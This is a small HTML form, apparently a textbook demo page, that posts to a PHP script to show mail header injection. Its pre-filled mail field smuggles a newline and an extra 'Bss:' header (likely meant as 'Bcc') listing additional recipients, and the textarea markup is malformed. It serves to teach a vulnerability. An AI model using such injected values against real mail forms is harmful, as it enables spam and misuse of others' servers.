<html>
    <head>
        <title>リスト10.7に投稿するページ</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    </head>
    <body>
        <form action="mail_header_injection_02.php" method="post">
            件名<textarea name="subject" value="spam mail" />
件名フィールド2件目</textarea><br />
            メール<textarea name="form">foo@example.com
Bss: bar@example.com, buz@example.com</textarea><br />
            内容<textarea name="body">メールヘッダインジェクションです。
Bssで意図しない相手にメールを送信しています。
</textarea><br />
            <input type="submit" value="メール送信" />
        </form>
    </body>
</html>
